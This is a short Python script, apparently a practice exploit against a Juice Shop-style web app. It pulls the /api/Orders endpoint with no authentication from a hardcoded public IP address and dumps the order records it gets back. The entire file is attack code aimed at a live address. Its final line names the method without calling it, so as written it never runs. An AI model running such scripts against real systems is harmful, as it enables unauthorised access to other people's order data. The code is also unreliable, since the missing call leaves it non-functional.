import requests
import json

class RetrieveListOrders:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def run_exploit(self):
        print(f"[+] Fetching /api/Orders API...")
        response = self.session.get(f"{self.base_url}/api/Orders", headers=self.headers)

        if response.status_code == 200:
            orders_data = response.json()
            print("[+] Retrieved Orders:")
            print(json.dumps(orders_data, indent=4))
        else:
            print(f"[-] Failed to retrieve orders. Status Code: {response.status_code}")


if __name__ == "__main__":
    url = "http://45.76.47.218:3000"
    exploit = RetrieveListOrders(url)
    exploit.run_exploit
